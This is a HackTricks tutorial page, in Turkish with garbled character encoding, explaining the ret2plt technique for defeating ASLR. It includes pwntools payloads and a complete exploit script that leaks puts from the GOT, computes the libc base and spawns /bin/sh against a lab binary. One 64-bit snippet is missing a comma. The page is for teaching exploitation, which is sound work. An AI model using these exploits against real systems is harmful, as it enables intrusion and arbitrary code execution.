# Ret2plt

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Temel Bilgiler

Bu tekniÄŸin amacÄ±, **ASLR'yi atlatabilmek iÃ§in PLT'den bir fonksiyonun adresini sÄ±zdÄ±rmak** olacaktÄ±r. Bunun nedeni, Ã¶rneÄŸin, libc'den `puts` fonksiyonunun adresini sÄ±zdÄ±rÄ±rsanÄ±z, **`libc`'nin temel adresini hesaplayabilir** ve **`system`** gibi diÄŸer fonksiyonlara eriÅŸmek iÃ§in ofsetleri hesaplayabilirsiniz.

Bu, ([**buradan**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)) gibi bir `pwntools` yÃ¼kÃ¼ ile yapÄ±labilir:
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Not edin ki **`puts`** (PLT'den alÄ±nan adres kullanÄ±larak) GOT'taki `puts` adresi ile Ã§aÄŸrÄ±lÄ±r. Bunun nedeni, `puts` `puts`'un GOT giriÅŸini yazdÄ±rdÄ±ÄŸÄ±nda, bu **giriÅŸin bellek iÃ§indeki `puts`'un tam adresini iÃ§erecek olmasÄ±dÄ±r**.

AyrÄ±ca, `main` adresinin istismarda nasÄ±l kullanÄ±ldÄ±ÄŸÄ±nÄ± not edin, bÃ¶ylece `puts` iÅŸlemini bitirdiÄŸinde, **binary `main`'i tekrar Ã§aÄŸÄ±rÄ±r, Ã§Ä±kmak yerine** (bÃ¶ylece sÄ±zdÄ±rÄ±lan adres geÃ§erli olmaya devam eder).

{% hint style="danger" %}
Bunun Ã§alÄ±ÅŸmasÄ± iÃ§in **binary PIE ile derlenmemiÅŸ olmalÄ±dÄ±r** veya **PIE'yi atlatmak iÃ§in bir sÄ±zÄ±ntÄ± bulmuÅŸ olmalÄ±sÄ±nÄ±z** ki PLT, GOT ve `main` adresini bilebilesiniz. Aksi takdirde, Ã¶nce PIE'yi atlatmanÄ±z gerekir.
{% endhint %}

Bu atlatmanÄ±n [**tam Ã¶rneÄŸini burada bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Bu, o Ã¶rnekteki son istismardÄ±:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## DiÄŸer Ã¶rnekler ve Referanslar

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR etkin ama PIE yok, ilk adÄ±m bir taÅŸmayÄ± canary'nin 0x00 byte'Ä±na kadar doldurmak ve ardÄ±ndan puts Ã§aÄŸÄ±rarak leak yapmak. Canary ile bir ROP gadget oluÅŸturulur, puts'u Ã§aÄŸÄ±rarak GOT'tan puts'un adresini leak eder ve ardÄ±ndan `system('/bin/sh')` Ã§aÄŸÄ±rmak iÃ§in bir ROP gadget.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR etkin, canary yok, bir Ã§ocuk fonksiyondan main'de stack overflow. Puts'u Ã§aÄŸÄ±rmak iÃ§in bir ROP gadget, GOT'tan puts'un adresini leak eder ve ardÄ±ndan bir gadget Ã§aÄŸÄ±rÄ±r.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
